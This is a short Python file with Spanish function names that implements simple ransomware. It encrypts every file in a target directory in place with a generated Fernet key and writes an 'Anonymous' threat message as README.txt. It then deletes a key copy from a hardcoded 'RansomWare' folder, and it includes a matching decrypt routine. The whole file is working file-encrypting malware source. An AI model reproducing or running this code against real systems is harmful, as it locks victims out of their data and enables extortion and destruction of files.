from cryptography.fernet import Fernet
import os
import time 

def generar_key(path):
    key = Fernet.generate_key()
    with open(path + '/key.key','wb') as key_file:
        key_file.write(key)
    with open(path + '/key.txt','wb') as key_file:
        key_file.write(key)
    
def cargar_key():
    return open('key.key','rb').read()

def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

def WriteFile(path):
    with open(path + '/README.txt','w') as file:
        file.write('We are Anonymous, we are legion,\n')
        file.write('we do not forgive, we do not forget. Expect us.')

    with open(path + '/Credenciales.txt','w') as file:
        file.write(path +'\n')
        #file.write(str(key))
   
def AnonNews(path):
    path_to_encrypt = path
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]
    generar_key(path)
    key = cargar_key()
    encrypt(full_path,key)
    WriteFile(path_to_encrypt)   
    #segundos = 0
    #while segundos<=60:
    #    start = time.time()         
    #   end = time.time()
    #   segundos = segundos + (end-start)
    path_key = '/home/anon23/Descargas/RansomWare'
    if os.path.exists(path_key + '/key.txt'):
        os.remove(path_key + '/key.txt')

    
def decrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            if not ReservedFiles(item):                
                continue                   
            encrypted_data = file.read()       
        decrypted_data = f.decrypt(encrypted_data)
        with open(item,'wb') as file:
            file.write(decrypted_data)

def ReservedFiles(item):
    files = ["README.txt","Credenciales.txt","key.txt","key.key"]
    for file in files:
        if file in item:
            return False
    return True

def AnonNewsD(path,key):
    path_to_encrypt = path
   
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]   
    key = key
    decrypt(full_path,key)
    if os.path.exists(path_to_encrypt + '/README.txt'):
        os.remove(path_to_encrypt + '/README.txt')  
    if os.path.exists(path_to_encrypt + '/Credenciales.txt'):
        os.remove(path_to_encrypt + '/Credenciales.txt')  
   